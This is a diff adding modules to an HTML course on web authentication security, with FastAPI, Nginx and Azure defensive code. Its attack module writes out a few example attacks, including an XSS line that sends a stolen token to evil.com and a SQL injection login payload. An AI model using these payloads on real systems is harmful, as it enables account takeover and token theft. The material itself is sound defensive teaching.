+        <span class="s">"exp"</span>: datetime.<span class="f">now</span>(timezone.utc) + timedelta(minutes=<span class="n">5</span>),  <span class="c"># Very short</span>
+        <span class="s">"type"</span>: <span class="s">"service"</span>
+    }
+    <span class="k">return</span> jwt.<span class="f">encode</span>(payload, SERVICE_SECRET, algorithm=<span class="s">"HS256"</span>)
+
+<span class="k">async def</span> <span class="f">call_internal_api</span>(endpoint: str, data: dict):
+    token = <span class="f">create_service_token</span>()
+    <span class="k">async with</span> httpx.<span class="f">AsyncClient</span>() <span class="k">as</span> client:
+        <span class="k">return await</span> client.<span class="f">post</span>(
+            <span class="s">f"http://internal-api:8000{endpoint}"</span>,
+            json=data,
+            headers={
+                <span class="s">"Authorization"</span>: <span class="s">f"Bearer {token}"</span>,
+                <span class="s">"X-Service-Name"</span>: SERVICE_NAME
+            }
+        )</div>
+</section>
+
+<!-- ═══ WEBHOOK SECURITY ═══ -->
+<section id="sec-webhook-security" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 29 · Build It</div>
+    <h1 class="htitle">Webhook <span>Signatures</span></h1>
+    <p class="hsub">Webhooks are HTTP callbacks from external services to your API. Without signature verification, anyone can send fake webhook events to your endpoint.</p>
+  </div>
+
+  <h2>How webhook signatures work</h2>
+  <div class="flow">
+    <div class="fr">
+      <div class="fbox" style="background:rgba(244,63,94,.1);border-color:rgba(244,63,94,.3);color:var(--a5)">LiveKit/Stripe</div>
+      <div class="fa">──POST /webhook + HMAC signature──▶</div>
+      <div class="fbox" style="background:rgba(16,185,129,.1);border-color:rgba(16,185,129,.3);color:var(--a3)">Your FastAPI</div>
+      <div class="fa">──recompute HMAC, compare──▶</div>
+      <div class="fbox" style="background:rgba(0,212,255,.1);border-color:rgba(0,212,255,.3);color:var(--a1)">Accept or Reject</div>
+    </div>
+  </div>
+
+  <div class="clabel">webhook_verify.py — Generic HMAC signature verification</div>
+  <div class="code"><span class="k">import</span> hmac, hashlib, secrets
+<span class="k">from</span> fastapi <span class="k">import</span> Request, HTTPException
+
+<span class="k">async def</span> <span class="f">verify_webhook_signature</span>(
+    request: Request,
+    secret: str,
+    header_name: str = <span class="s">"X-Signature-256"</span>
+):
+    <span class="c"># CRITICAL: Read raw bytes BEFORE any parsing</span>
+    body = <span class="k">await</span> request.<span class="f">body</span>()
+    signature_header = request.headers.<span class="f">get</span>(header_name, <span class="s">""</span>)
+
+    <span class="c"># Recompute expected signature</span>
+    expected = hmac.<span class="f">new</span>(
+        secret.<span class="f">encode</span>(),
+        body,
+        hashlib.sha256
+    ).<span class="f">hexdigest</span>()
+    expected_header = <span class="s">f"sha256={expected}"</span>
+
+    <span class="c"># Constant-time comparison (prevents timing attacks)</span>
+    <span class="k">if not</span> secrets.<span class="f">compare_digest</span>(signature_header, expected_header):
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>, detail=<span class="s">"Invalid webhook signature"</span>)
+    <span class="k">return</span> body
+
+<span class="c"># ─── LiveKit webhook ───────────────────────────────────────────────────</span>
+<span class="f">@app.post</span>(<span class="s">"/webhook/livekit"</span>)
+<span class="k">async def</span> <span class="f">livekit_webhook</span>(request: Request):
+    body = <span class="k">await</span> <span class="f">verify_webhook_signature</span>(request, LIVEKIT_API_SECRET, <span class="s">"Authorization"</span>)
+    event = json.<span class="f">loads</span>(body)
+    <span class="k">if</span> event[<span class="s">"event"</span>] == <span class="s">"room_finished"</span>:
+        <span class="k">await</span> <span class="f">handle_room_finished</span>(event[<span class="s">"room"</span>])
+    <span class="k">return</span> {<span class="s">"received"</span>: <span class="n">True</span>}
+
+<span class="c"># ─── Stripe webhook ────────────────────────────────────────────────────</span>
+<span class="f">@app.post</span>(<span class="s">"/webhook/stripe"</span>)
+<span class="k">async def</span> <span class="f">stripe_webhook</span>(request: Request):
+    body = <span class="k">await</span> <span class="f">verify_webhook_signature</span>(request, STRIPE_WEBHOOK_SECRET, <span class="s">"Stripe-Signature"</span>)
+    ...</div>
+</section>
+
+<!-- ═══ WS WEBRTC AUTH ═══ -->
+<section id="sec-ws-webrtc-auth" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 30 · Service Security</div>
+    <h1 class="htitle">WebSocket &amp; WebRTC <span>Auth</span></h1>
+    <p class="hsub">WebSockets and WebRTC connections have special auth challenges because they're long-lived persistent connections, not one-off HTTP requests.</p>
+  </div>
+
+  <h2>WebSocket auth strategies</h2>
+  <div class="callout q4"><strong>WebSocket headers during handshake:</strong> The initial WebSocket handshake is an HTTP upgrade request — you CAN set headers. But after the connection is established, you can't add headers to WebSocket frames. Authenticate at connection time.</div>
+
+  <div class="clabel">FastAPI WebSocket auth</div>
+  <div class="code"><span class="k">from</span> fastapi <span class="k">import</span> WebSocket, WebSocketDisconnect
+
+<span class="f">@app.websocket</span>(<span class="s">"/ws/chat"</span>)
+<span class="k">async def</span> <span class="f">websocket_chat</span>(websocket: WebSocket, token: str = <span class="s">""</span>):
+    <span class="c"># Token passed as query param: ws://host/ws/chat?token=eyJ...</span>
+    <span class="k">try</span>:
+        payload = <span class="f">decode_token</span>(token)
+        user_id = payload[<span class="s">"sub"</span>]
+    <span class="k">except</span> Exception:
+        <span class="k">await</span> websocket.<span class="f">close</span>(code=<span class="n">4001</span>)  <span class="c"># Custom code: auth failed</span>
+        <span class="k">return</span>
+
+    <span class="k">await</span> websocket.<span class="f">accept</span>()
+    <span class="k">try</span>:
+        <span class="k">while True</span>:
+            data = <span class="k">await</span> websocket.<span class="f">receive_text</span>()
+            <span class="k">await</span> websocket.<span class="f">send_text</span>(<span class="s">f"User {user_id}: {data}"</span>)
+    <span class="k">except</span> WebSocketDisconnect:
+        <span class="f">print</span>(<span class="s">f"User {user_id} disconnected"</span>)</div>
+
+  <div class="clabel">JS Frontend — WebSocket with token</div>
+  <div class="code"><span class="c">// Get fresh short-lived token for WebSocket connection</span>
+<span class="k">const</span> wsToken = <span class="k">await</span> <span class="f">getWsToken</span>();  <span class="c">// Call /api/auth/ws-token — 2 min expiry</span>
+<span class="k">const</span> ws = <span class="k">new</span> <span class="f">WebSocket</span>(<span class="s">`wss://yourapp.com/ws/chat?token=${wsToken}`</span>);
+
+ws.onopen = () => <span class="f">console</span>.<span class="f">log</span>(<span class="s">'Connected'</span>);
+ws.onmessage = (event) => <span class="f">console</span>.<span class="f">log</span>(event.data);
+ws.onerror = (e) => {
+  <span class="k">if</span> (e.code === <span class="n">4001</span>) <span class="f">redirectToLogin</span>();  <span class="c">// Auth failed</span>
+};</div>
+
+  <h2>WebRTC auth — control via signaling server</h2>
+  <div class="clabel">LiveKit token generation (FastAPI)</div>
+  <div class="code"><span class="k">from</span> livekit <span class="k">import</span> api
+
+<span class="f">@app.post</span>(<span class="s">"/api/call/join-token"</span>)
+<span class="k">async def</span> <span class="f">get_call_token</span>(room_name: str, current_user = <span class="f">Depends</span>(get_current_user)):
+    <span class="c"># Only authenticated users get a LiveKit token</span>
+    token = api.AccessToken(LIVEKIT_API_KEY, LIVEKIT_API_SECRET)
+    token.with_grants(api.VideoGrants(
+        room_join=<span class="n">True</span>,
+        room=room_name,
+        can_publish=<span class="n">True</span>,
+        can_subscribe=<span class="n">True</span>,
+    ))
+    token.with_identity(current_user.username)
+    <span class="k">return</span> {<span class="s">"token"</span>: token.<span class="f">to_jwt</span>()}</div>
+</section>
+
+<!-- ═══ TOKEN STORAGE ═══ -->
+<section id="sec-token-storage" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 31 · Token Storage</div>
+    <h1 class="htitle">Where to <span>Store Tokens</span></h1>
+    <p class="hsub">Where you store tokens determines your attack surface. This is one of the most debated security topics in web development. Here's the definitive answer.</p>
+  </div>
+
+  <div class="tw"><table>
+    <thead><tr><th>Storage</th><th>XSS risk</th><th>CSRF risk</th><th>Survives refresh</th><th>Verdict</th></tr></thead>
+    <tbody>
+      <tr><td>Memory (JS var)</td><td><span class="pill p3">None</span></td><td><span class="pill p3">None</span></td><td><span class="pill p5">No</span></td><td><span class="pill p3">Best for access token</span></td></tr>
+      <tr><td>HttpOnly Cookie</td><td><span class="pill p3">None (JS can't read)</span></td><td><span class="pill p4">Possible (use CSRF token)</span></td><td><span class="pill p3">Yes</span></td><td><span class="pill p3">Best for refresh token</span></td></tr>
+      <tr><td>localStorage</td><td><span class="pill p5">High (readable by any JS)</span></td><td><span class="pill p3">None</span></td><td><span class="pill p3">Yes</span></td><td><span class="pill p5">Never use for auth tokens</span></td></tr>
+      <tr><td>sessionStorage</td><td><span class="pill p5">High (readable by any JS)</span></td><td><span class="pill p3">None</span></td><td><span class="pill p5">No (tab close)</span></td><td><span class="pill p5">Avoid for auth tokens</span></td></tr>
+      <tr><td>Regular Cookie</td><td><span class="pill p5">High (readable by JS)</span></td><td><span class="pill p4">Possible</span></td><td><span class="pill p3">Yes</span></td><td><span class="pill p5">Never — use HttpOnly</span></td></tr>
+    </tbody>
+  </table></div>
+
+  <h2>The recommended pattern</h2>
+  <div class="layers">
+    <div class="layer" style="border-color:var(--a1);background:rgba(0,212,255,.04)"><div class="lname" style="color:var(--a1)">Access Token → JavaScript memory (a const variable)</div><div class="ldesc">Short-lived (15 min). Invisible to XSS since attackers can't read JS variables at rest. Lost on page refresh — re-fetched using refresh token automatically.</div></div>
+    <div class="layer" style="border-color:var(--a3);background:rgba(16,185,129,.04)"><div class="lname" style="color:var(--a3)">Refresh Token → HttpOnly Secure SameSite=Lax Cookie</div><div class="ldesc">Long-lived (7 days). HttpOnly flag makes it completely invisible to JavaScript. Survives page refreshes. Protected against CSRF by SameSite=Lax.</div></div>
+  </div>
+
+  <div class="callout q5"><strong>The XSS argument against localStorage:</strong> If your app has an XSS vulnerability (and most do at some point), an attacker can run <code>localStorage.getItem('token')</code> and steal every user's tokens. With HttpOnly cookies + in-memory access tokens, XSS cannot read either token type.</div>
+</section>
+
+<!-- ═══ CORS & CSRF ═══ -->
+<section id="sec-cors-csrf" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 32 · Token Transport</div>
+    <h1 class="htitle">CORS &amp; <span>CSRF</span></h1>
+    <p class="hsub">Two browser security mechanisms that every backend developer must understand to build secure, functional APIs.</p>
+  </div>
+
+  <h2>CORS — Cross-Origin Resource Sharing</h2>
+  <p>CORS controls which domains can call your API from a browser. It's enforced by the browser (not your server). Servers declare what's allowed; browsers enforce it.</p>
+
+  <div class="callout q4"><strong>The CORS preflight:</strong> Before sending a "dangerous" request (non-GET, or with custom headers like Authorization), the browser sends an <code>OPTIONS</code> request asking "is this allowed?" Your server must respond with the right CORS headers or the actual request is blocked.</div>
+
+  <div class="clabel">FastAPI CORS configuration</div>
+  <div class="code"><span class="k">from</span> fastapi.middleware.cors <span class="k">import</span> CORSMiddleware
+
+app.<span class="f">add_middleware</span>(
+    CORSMiddleware,
+    allow_origins=[
+        <span class="s">"https://yourapp.com"</span>,
+        <span class="s">"https://admin.yourapp.com"</span>,
+        <span class="c"># "http://localhost:3000",  ← Only in development</span>
+    ],
+    allow_credentials=<span class="n">True</span>,   <span class="c"># Required to send cookies cross-origin</span>
+    allow_methods=[<span class="s">"GET"</span>, <span class="s">"POST"</span>, <span class="s">"PUT"</span>, <span class="s">"DELETE"</span>],
+    allow_headers=[<span class="s">"Authorization"</span>, <span class="s">"Content-Type"</span>, <span class="s">"X-CSRF-Token"</span>],
+)
+<span class="c"># NEVER use allow_origins=["*"] with allow_credentials=True</span></div>
+
+  <h2>CSRF — Cross-Site Request Forgery</h2>
+  <p>CSRF tricks a logged-in user's browser into making unintended requests to your API. If a user visits a malicious site while logged into your app, the malicious site can trigger actions using the user's cookies.</p>
+
+  <div class="clabel">Django CSRF (built-in and automatic)</div>
+  <div class="code"><span class="c"># Django has CSRF protection enabled by default via CsrfViewMiddleware</span>
+<span class="c"># For AJAX calls, include the CSRF token in the header:</span>
+
+<span class="c"># Frontend JavaScript:</span>
+<span class="k">function</span> <span class="f">getCsrfToken</span>() {
+  <span class="k">return</span> document.cookie.<span class="f">split</span>(<span class="s">';'</span>)
+    .<span class="f">find</span>(c => c.trim().<span class="f">startsWith</span>(<span class="s">'csrftoken='</span>))
+    ?.<span class="f">split</span>(<span class="s">'='</span>)[<span class="n">1</span>];
+}
+
+<span class="k">fetch</span>(<span class="s">'/api/data'</span>, {
+  method: <span class="s">'POST'</span>,
+  headers: {
+    <span class="s">'X-CSRFToken'</span>: <span class="f">getCsrfToken</span>(),   <span class="c">// Django expects this header</span>
+    <span class="s">'Content-Type'</span>: <span class="s">'application/json'</span>
+  },
+  body: <span class="f">JSON.stringify</span>(data)
+});
+
+<span class="c"># FastAPI with cookies: implement CSRF token pattern</span>
+<span class="c"># Or: Use SameSite=Lax cookies — protects against CSRF without tokens</span></div>
+
+  <div class="dd">
+    <div class="do"><h4>CSRF protection strategies</h4><ul>
+      <li>SameSite=Lax or Strict cookies (browser-enforced)</li>
+      <li>CSRF token in form/header (Django built-in)</li>
+      <li>Verify Origin/Referer header</li>
+      <li>Double-submit cookie pattern</li>
+    </ul></div>
+    <div class="dont"><h4>What doesn't protect against CSRF</h4><ul>
+      <li>HTTPS alone (CSRF works over HTTPS)</li>
+      <li>Checking for authentication (user IS logged in)</li>
+      <li>localStorage tokens (but they're still XSS-risky)</li>
+      <li>IP address validation</li>
+    </ul></div>
+  </div>
+</section>
+
+<!-- ═══ ATTACKS ═══ -->
+<section id="sec-attacks" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 33 · Attacks</div>
+    <h1 class="htitle">Common Auth <span>Attacks</span></h1>
+    <p class="hsub">You can't defend against attacks you don't understand. Here are the most common authentication attacks and exactly how to prevent them.</p>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">JWT Algorithm Confusion Attack (alg=none) <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> Attacker modifies the JWT header to <code>{"alg": "none"}</code> and removes the signature. Some libraries skip verification for the "none" algorithm.<br><br>
+      <strong>Impact:</strong> Attacker can forge any JWT with any claims (admin role, any user ID) without knowing the secret.<br><br>
+      <strong>Defense:</strong> <strong>Always specify the allowed algorithm</strong> explicitly when verifying: <code>jwt.decode(token, secret, algorithms=["HS256"])</code>. Never allow "none" or accept algorithm from the token header.
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">JWT Secret Brute Force <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> If your HS256 JWT secret is weak (e.g., "secret", "1234"), an attacker with a stolen token can crack the secret offline and forge tokens.<br><br>
+      <strong>Defense:</strong> Use cryptographically random secrets of at least 256 bits: <code>python -c "import secrets; print(secrets.token_hex(32))"</code>. Store in Azure Key Vault, not environment files checked into git.
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">SQL Injection in Login Form <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> Attacker enters <code>' OR '1'='1</code> as username. If backend does <code>f"SELECT * FROM users WHERE username='{username}'"</code>, the query returns all users and logs them in as the first one.<br><br>
+      <strong>Defense:</strong> <strong>Always use parameterized queries or ORM.</strong> SQLAlchemy, Django ORM, and FastAPI with Pydantic all prevent this automatically. Never use string formatting in SQL queries.
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">Brute Force / Credential Stuffing <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> Automated scripts try millions of username/password combinations. Credential stuffing uses leaked password databases from other sites.<br><br>
+      <strong>Defense:</strong> Rate limiting (max 5 failed attempts, then 15-minute lockout), CAPTCHA after failures, alerting users of login from new locations, MFA, checking passwords against HaveIBeenPwned API.
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">XSS → Token Theft <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> Attacker injects JavaScript (via comment, user input, etc.) that runs <code>fetch('https://evil.com?token=' + localStorage.getItem('jwt'))</code>.<br><br>
+      <strong>Defense:</strong> Never store tokens in localStorage. Use HttpOnly cookies for refresh tokens and memory for access tokens. Sanitize all user input. Set Content-Security-Policy header.
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">CSRF — Cross-Site Request Forgery <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> A malicious website makes your logged-in user's browser submit a form or AJAX request to your API, using their existing session cookie.<br><br>
+      <strong>Defense:</strong> SameSite=Lax cookies, CSRF tokens, verify Origin header. If using JWT in Authorization header (not cookies), CSRF is not a risk since browsers don't auto-send Authorization headers.
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">Open Redirect After Login <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> <code>https://yourapp.com/login?next=https://evil.com</code>. After login, if you blindly redirect to the <code>next</code> parameter, the user is sent to the attacker's site (which can display a fake login page to steal credentials again).<br><br>
+      <strong>Defense:</strong> Only allow redirect to paths within your domain. <code>if next.startswith('/') and not next.startswith('//'): redirect(next)</code>. Reject any redirect with a full domain.
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">Timing Attack on Secret Comparison <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <strong>Attack:</strong> Regular string comparison <code>a == b</code> stops at the first mismatched character. By measuring how long the comparison takes, an attacker can guess the secret character by character.<br><br>
+      <strong>Defense:</strong> Always use <code>secrets.compare_digest(a, b)</code> which takes constant time regardless of where strings differ. Use this for API keys, HMAC signatures, and any secret comparison.
+    </div>
+  </div>
+</section>
+
+<!-- ═══ RATE LIMITING ═══ -->
+<section id="sec-rate-limiting" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 34 · Attacks</div>
+    <h1 class="htitle">Rate Limiting &amp; <span>Brute Force</span> Protection</h1>
+    <p class="hsub">Without rate limiting, your login endpoint is an open invitation for brute force and credential stuffing attacks. Here's how to protect it at every layer.</p>
+  </div>
+
+  <div class="clabel">FastAPI — Rate limiting with slowapi</div>
+  <div class="code">pip install slowapi redis
+
+<span class="k">from</span> slowapi <span class="k">import</span> Limiter, _rate_limit_exceeded_handler
+<span class="k">from</span> slowapi.util <span class="k">import</span> get_remote_address
+<span class="k">from</span> slowapi.errors <span class="k">import</span> RateLimitExceeded
+
+limiter = <span class="f">Limiter</span>(key_func=get_remote_address, storage_uri=<span class="s">"redis://localhost:6379"</span>)
+app.state.limiter = limiter
+app.<span class="f">add_exception_handler</span>(RateLimitExceeded, _rate_limit_exceeded_handler)
+
+<span class="f">@app.post</span>(<span class="s">"/api/auth/login"</span>)
+<span class="f">@limiter.limit</span>(<span class="s">"5/minute"</span>)          <span class="c"># 5 requests per minute per IP</span>
+<span class="k">async def</span> <span class="f">login</span>(request: Request, ...):
+    ...
+
+<span class="f">@app.post</span>(<span class="s">"/api/auth/register"</span>)
+<span class="f">@limiter.limit</span>(<span class="s">"3/hour"</span>)            <span class="c"># Max 3 registrations per hour per IP</span>
+<span class="k">async def</span> <span class="f">register</span>(request: Request, ...):
+    ...</div>
+
+  <div class="clabel">Nginx — Rate limiting at the network layer</div>
+  <div class="code"><span class="c"># /etc/nginx/nginx.conf</span>
+http {
+    <span class="c"># Define rate limit zone: 10MB memory, 10 requests/second per IP</span>
+    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
+    limit_req_zone $binary_remote_addr zone=api:10m rate=100r/m;
+
+    server {
+        <span class="c"># Apply strict limit to auth endpoints</span>
+        location /api/auth/ {
+            limit_req zone=login burst=10 nodelay;
+            limit_req_status 429;
+            proxy_pass http://localhost:8000;
+        }
+
+        <span class="c"># General API rate limit</span>
+        location /api/ {
+            limit_req zone=api burst=50;
+            proxy_pass http://localhost:8000;
+        }
+    }
+}</div>
+
+  <div class="clabel">Account lockout (FastAPI + Redis)</div>
+  <div class="code"><span class="k">import</span> redis
+r = redis.<span class="f">Redis</span>(host=<span class="s">'localhost'</span>, port=<span class="n">6379</span>)
+
+MAX_ATTEMPTS = <span class="n">5</span>
+LOCKOUT_SECONDS = <span class="n">900</span>  <span class="c"># 15 minutes</span>
+
+<span class="k">def</span> <span class="f">check_login_attempts</span>(username: str):
+    key = <span class="s">f"login_attempts:{username}"</span>
+    attempts = r.<span class="f">get</span>(key)
+    <span class="k">if</span> attempts <span class="k">and</span> <span class="f">int</span>(attempts) >= MAX_ATTEMPTS:
+        ttl = r.<span class="f">ttl</span>(key)
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">429</span>,
+            detail=<span class="s">f"Account locked. Try again in {ttl} seconds."</span>)
+
+<span class="k">def</span> <span class="f">record_failed_attempt</span>(username: str):
+    key = <span class="s">f"login_attempts:{username}"</span>
+    r.<span class="f">incr</span>(key)
+    r.<span class="f">expire</span>(key, LOCKOUT_SECONDS)   <span class="c"># Reset lockout timer</span>
+
+<span class="k">def</span> <span class="f">reset_attempts</span>(username: str):
+    r.<span class="f">delete</span>(<span class="s">f"login_attempts:{username}"</span>)</div>
+</section>
+
+<!-- ═══ NGINX AUTH ═══ -->
+<section id="sec-nginx-auth" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 35 · Production</div>
+    <h1 class="htitle">Nginx <span>Auth Config</span></h1>
+    <p class="hsub">Nginx is the first line of defense. Proper Nginx configuration can block attacks before they reach your Python code.</p>
+  </div>
+
+  <div class="clabel">/etc/nginx/sites-available/yourapp — Production Nginx config</div>
+  <div class="code">server {
+    listen 443 ssl http2;
+    server_name yourapp.com;
+
+    ssl_certificate     /etc/letsencrypt/live/yourapp.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/yourapp.com/privkey.pem;
+    ssl_protocols       TLSv1.2 TLSv1.3;    <span class="c"># Disable TLS 1.0 and 1.1</span>
+    ssl_ciphers         HIGH:!aNULL:!MD5;
+
+    <span class="c"># Security headers</span>
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+    add_header X-Content-Type-Options    "nosniff" always;
+    add_header X-Frame-Options           "DENY" always;
+    add_header Referrer-Policy           "strict-origin-when-cross-origin" always;
+    add_header Content-Security-Policy   "default-src 'self'" always;
+    add_header X-XSS-Protection          "1; mode=block" always;
+
+    <span class="c"># Forward real IP to backend (important for rate limiting)</span>
+    proxy_set_header X-Real-IP          $remote_addr;
+    proxy_set_header X-Forwarded-For    $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto  $scheme;
+
+    <span class="c"># ─── Admin panel: IP whitelist only ─────────────────────────────</span>
+    location /secret-admin/ {
+        allow 203.0.113.10;   <span class="c"># Your static IP</span>
+        allow 10.0.0.0/8;     <span class="c"># Internal network</span>
+        deny all;
+        proxy_pass http://127.0.0.1:8000;
+    }
+
+    <span class="c"># ─── Webhook endpoints: external services only ──────────────────</span>
+    location /webhook/livekit {
+        allow 102.42.0.0/16;   <span class="c"># LiveKit IP range</span>
+        deny all;
+        proxy_pass http://127.0.0.1:8000;
+        proxy_set_header Authorization $http_authorization;  <span class="c"># Don't strip auth</span>
+    }
+
+    <span class="c"># ─── Internal endpoints: block entirely ─────────────────────────</span>
+    location /internal/ {
+        deny all;
+        return 403;
+    }
+
+    <span class="c"># ─── Public API with rate limiting ──────────────────────────────</span>
+    location /api/ {
+        limit_req zone=api burst=50 nodelay;
+        proxy_pass http://127.0.0.1:8000;
+    }
+
+    <span class="c"># ─── Auth endpoints: strict rate limiting ───────────────────────</span>
+    location /api/auth/ {
+        limit_req zone=login burst=5 nodelay;
+        proxy_pass http://127.0.0.1:8000;
+    }
+
+    <span class="c"># ─── WebSocket support ──────────────────────────────────────────</span>
+    location /ws/ {
+        proxy_pass http://127.0.0.1:8000;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade    $http_upgrade;
+        proxy_set_header Connection "upgrade";
+        proxy_read_timeout 3600;
+    }
+}</div>
+</section>
+
+<!-- ═══ AZURE AUTH ═══ -->
+<section id="sec-azure-auth" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 36 · Production</div>
+    <h1 class="htitle">Azure / Cloud <span>Auth</span></h1>
+    <p class="hsub">Leveraging Azure-native features for secrets management, identity, and network security.</p>
+  </div>
+
+  <h2>Azure Key Vault — store all secrets</h2>
+  <div class="callout q3"><strong>Never store secrets in .env files or code repos.</strong> Azure Key Vault encrypts and audits access to all your secrets (JWT secret keys, API keys, DB passwords, OAuth secrets). If your VM is compromised, the attacker can't read the Key Vault without Azure AD credentials.</div>
+
+  <div class="clabel">fastapi — read secrets from Azure Key Vault</div>
+  <div class="code">pip install azure-keyvault-secrets azure-identity
+
+<span class="k">from</span> azure.keyvault.secrets <span class="k">import</span> SecretClient
+<span class="k">from</span> azure.identity <span class="k">import</span> DefaultAzureCredential
+
+vault_url = <span class="s">"https://your-vault.vault.azure.net/"</span>
+credential = <span class="f">DefaultAzureCredential</span>()  <span class="c"># Uses managed identity on Azure VM</span>
+client = <span class="f">SecretClient</span>(vault_url=vault_url, credential=credential)
+
+<span class="c"># On startup, load secrets from Key Vault into memory</span>
+JWT_SECRET = client.<span class="f">get_secret</span>(<span class="s">"jwt-secret-key"</span>).value
+DB_PASSWORD = client.<span class="f">get_secret</span>(<span class="s">"database-password"</span>).value
+GOOGLE_CLIENT_SECRET = client.<span class="f">get_secret</span>(<span class="s">"google-oauth-secret"</span>).value</div>
+
+  <h2>Azure AD / Entra ID authentication</h2>
+  <div class="clabel">FastAPI — Validate Azure AD tokens</div>
+  <div class="code">pip install msal python-jose
+
+<span class="k">import</span> requests
+<span class="k">from</span> jose <span class="k">import</span> jwt
+
+TENANT_ID = <span class="s">"your-tenant-id"</span>
+CLIENT_ID = <span class="s">"your-app-client-id"</span>
+
+<span class="k">def</span> <span class="f">get_azure_public_keys</span>():
+    url = <span class="s">f"https://login.microsoftonline.com/{TENANT_ID}/discovery/v2.0/keys"</span>
+    <span class="k">return</span> requests.<span class="f">get</span>(url).<span class="f">json</span>()
+
+<span class="k">def</span> <span class="f">verify_azure_token</span>(token: str):
+    keys = <span class="f">get_azure_public_keys</span>()
+    <span class="k">return</span> jwt.<span class="f">decode</span>(
+        token, keys,
+        algorithms=[<span class="s">"RS256"</span>],
+        audience=CLIENT_ID,
+        issuer=<span class="s">f"https://sts.windows.net/{TENANT_ID}/"</span>
+    )</div>
+
+  <h2>Network Security Group rules (Azure)</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Rule</th><th>Source</th><th>Destination Port</th><th>Action</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td>Allow-HTTPS</td><td>Any</td><td>443</td><td><span class="pill p3">Allow</span></td><td>Public HTTPS traffic</td></tr>
+      <tr><td>Allow-Admin-IP</td><td>Your static IP</td><td>22, 443</td><td><span class="pill p3">Allow</span></td><td>SSH + Admin access</td></tr>
+      <tr><td>Block-Internal-APIs</td><td>Any</td><td>8001, 8002</td><td><span class="pill p5">Deny</span></td><td>Internal services not exposed</td></tr>
+      <tr><td>Allow-Internal</td><td>VNet</td><td>8000-9000</td><td><span class="pill p3">Allow</span></td><td>VM-to-VM communication within Azure</td></tr>
+      <tr><td>Deny-All</td><td>Any</td><td>All others</td><td><span class="pill p5">Deny</span></td><td>Default deny for everything else</td></tr>
+    </tbody>
+  </table></div>
+</section>
+
+<!-- ═══ CHECKLIST ═══ -->
+<section id="sec-checklist" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 37 · Reference</div>
+    <h1 class="htitle">Security <span>Checklist</span></h1>
+    <p class="hsub">A comprehensive checklist for every application you deploy. Run through this before going to production.</p>
+  </div>
+
+  <h2>Authentication Checklist</h2>
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">✅ Passwords &amp; Credentials <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <ul class="list">
+        <li>Passwords hashed with bcrypt (cost 12+) or Argon2id</li>
+        <li>Minimum password length enforced (12+ characters)</li>
+        <li>No password stored in plaintext anywhere (logs, DB, env files)</li>
+        <li>Passwords checked against HaveIBeenPwned API on registration</li>
+        <li>Account lockout after 5 failed attempts (15 min lockout)</li>
+        <li>Secure password reset flow (token-based, not "security questions")</li>
+        <li>Password reset tokens expire in 15-60 minutes, single use</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">✅ JWT Tokens <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <ul class="list">
+        <li>JWT secret is 256-bit random (not a word or phrase)</li>
+        <li>JWT secret stored in Azure Key Vault, not .env file in repo</li>
+        <li>Access token expires in 15 minutes or less</li>
+        <li>Algorithm specified explicitly in decode call (not from token)</li>
+        <li>"none" algorithm not accepted under any circumstances</li>
+        <li>Sensitive data NOT in JWT payload (passwords, full PII)</li>
+        <li>Refresh tokens stored in HttpOnly Secure SameSite=Lax cookies</li>
+        <li>Refresh tokens stored in DB with revocation capability</li>
+        <li>Token rotation on every refresh</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc" onclick="toggleAcc(this)">
+    <div class="acc-h">✅ Transport Security <span class="acc-ico">+</span></div>
+    <div class="acc-b">
+      <ul class="list">
+        <li>HTTPS enforced everywhere — no HTTP in production</li>
+        <li>HSTS header set (Strict-Transport-Security)</li>
